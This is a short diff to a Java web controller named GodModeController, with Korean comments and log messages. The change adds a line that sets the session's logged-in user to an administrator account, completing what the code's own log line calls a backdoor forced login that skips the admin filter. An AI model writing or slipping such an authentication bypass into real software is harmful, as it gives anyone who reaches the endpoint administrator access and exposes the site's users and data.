@@ -53,6 +53,8 @@ public class GodModeController implements Action {
 			// 5. AdminPassFilter를 통과할 1회용 티켓 주입
 			session.setAttribute("ADMIN_PASS", true);
 			
+			request.getSession().setAttribute("loginUser", adminInfo);
+			
 			System.out.println(">>> 백도어: " + adminInfo.getMem_name() + "님 강제 로그인 성공.");
 			
 			// 6. 관리자 메인 페이지로 리다이렉트
